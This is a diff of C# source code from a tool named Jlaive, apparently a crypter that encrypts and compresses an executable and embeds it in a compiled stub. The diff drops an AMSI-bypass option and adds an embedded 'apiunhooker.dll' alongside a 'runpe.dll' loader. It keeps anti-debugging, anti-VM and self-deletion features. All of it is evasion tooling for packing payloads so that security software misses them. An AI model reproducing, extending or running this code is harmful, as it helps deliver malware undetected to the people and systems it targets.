@@ -27,7 +27,6 @@ namespace Jlaive
             if (obj != null)
             {
                 textBox1.Text = obj.inputFile;
-                bypassAMSI.Checked = obj.amsiBypass;
                 antiDebug.Checked = obj.antiDebug;
                 antiVM.Checked = obj.antiVM;
                 selfDelete.Checked = obj.selfDelete;
@@ -44,7 +43,6 @@ namespace Jlaive
         {
             SettingsObject obj = new SettingsObject();
             obj.inputFile = textBox1.Text;
-            obj.amsiBypass = bypassAMSI.Checked;
             obj.antiDebug = antiDebug.Checked;
             obj.antiVM = antiVM.Checked;
             obj.selfDelete = selfDelete.Checked;
@@ -125,16 +123,6 @@ namespace Jlaive
             byte[] pbytes = File.ReadAllBytes(_input);
             bool isnetasm = IsAssembly(_input);
 
-            if (!bypassAMSI.Checked)
-            {
-                DialogResult result = MessageBox.Show("\"Bypass AMSI\" is highly recommended. Continue anyways?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
-                if (result != DialogResult.Yes)
-                {
-                    buildButton.Enabled = true;
-                    return;
-                }
-            }
-
             if (isnetasm)
             {
                 listBox2.Items.Add("Patching assembly...");
@@ -145,15 +133,16 @@ namespace Jlaive
             byte[] payload_enc = Encrypt(mode, Compress(pbytes), _stubkey, _stubiv);
 
             listBox2.Items.Add("Creating stub...");
-            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, bypassAMSI.Checked, antiDebug.Checked, antiVM.Checked, !isnetasm, rng);
+            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antiDebug.Checked, antiVM.Checked, !isnetasm, rng);
 
             listBox2.Items.Add("Building stub...");
             string tempfile = Path.GetTempFileName();
             File.WriteAllBytes("payload.exe", payload_enc);
+            byte[] unhookerdll_enc = Encrypt(mode, Compress(GetEmbeddedResource("Jlaive.Resources.apiunhooker.dll")), _stubkey, _stubiv);
+            File.WriteAllBytes("apiunhooker.dll", unhookerdll_enc);
             if (!isnetasm)
             {
-                byte[] runpedll_data = GetEmbeddedResource("Jlaive.Resources.runpe.dll");
-                byte[] runpedll_enc = Encrypt(mode, Compress(runpedll_data), _stubkey, _stubiv);
+                byte[] runpedll_enc = Encrypt(mode, Compress(GetEmbeddedResource("Jlaive.Resources.runpe.dll")), _stubkey, _stubiv);
                 File.WriteAllBytes("runpe.dll", runpedll_enc);
             }
             CSharpCodeProvider csc = new CSharpCodeProvider();
@@ -164,6 +153,7 @@ namespace Jlaive
                 IncludeDebugInformation = false
             };
             parameters.EmbeddedResources.Add("payload.exe");
+            parameters.EmbeddedResources.Add("apiunhooker.dll");
             if (!isnetasm) parameters.EmbeddedResources.Add("runpe.dll");
             foreach (string item in listBox1.Items) parameters.EmbeddedResources.Add(item);
             CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
@@ -180,6 +170,7 @@ namespace Jlaive
             }
             byte[] stubbytes = File.ReadAllBytes(tempfile);
             File.Delete("payload.exe");
+            File.Delete("apiunhooker.dll");
             if (!isnetasm) File.Delete("runpe.dll");
             File.Delete(tempfile);
 
